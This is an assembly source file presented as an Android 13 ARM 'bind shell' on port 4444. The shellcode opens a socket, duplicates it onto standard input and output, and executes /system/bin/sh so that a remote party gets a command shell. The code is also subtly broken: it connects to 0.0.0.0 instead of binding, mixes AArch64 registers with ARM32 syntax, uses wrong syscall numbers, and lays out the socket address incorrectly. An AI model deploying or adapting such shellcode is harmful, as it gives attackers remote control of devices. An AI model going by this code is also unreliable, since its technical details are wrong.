; Android 13 ARM Bind Shell on port 4444
.section .text
.global _start
_start:
    /* socket(AF_INET, SOCK_STREAM, 0) */
    mov x0, #2          @ AF_INET
    mov x1, #1          @ SOCK_STREAM
    mov x2, #0          @ protocol 0
    mov x8, #281        @ sys_socket
    svc 0
    mov x4, x0          @ save the socket descriptor in x4

    /* Allocate and fill sockaddr_in structure on stack (16 bytes) */
    sub sp, sp, #16
    mov w0, #2          @ AF_INET
    str w0, [sp]        @ sin_family = 2
    /* Convert port 4444 (0x115c) into network byte order: 0x5c11 */
    mov w0, #0x5c11
    str w0, [sp, #4]    @ sin_port
    /* Set sin_addr: choose 0.0.0.0 */
    mov w0, #0
    str w0, [sp, #8]    @ sin_addr = 0.0.0.0
    str w0, [sp, #12]   @ sin_zero = 0

    /* connect(socket, sockaddr_in, 16) */
    mov x0, x4          @ socket descriptor
    add x1, sp, #0      @ pointer to sockaddr_in structure
    mov x2, #16         @ length of structure
    mov x8, #283        @ sys_connect (use the appropriate syscall number for Android 13)
    svc 0

    /* Duplicate socket descriptor to stdin, stdout, stderr (dup2) */
    mov x1, #0
dup_loop:
    mov x0, x4
    mov x8, #63         @ sys_dup2
    svc 0
    add x1, x1, #1
    cmp x1, #3
    b.lt dup_loop

    /* Execute /system/bin/sh */
    ldr x0, =shell_path  @ pointer to "/system/bin/sh" (we put this in a data section)
    mov x1, #0
    mov x2, #0
    mov x8, #11         @ sys_execve
    svc 0

    b .
    
.section .data
shell_path:
    .asciz "/system/bin/sh"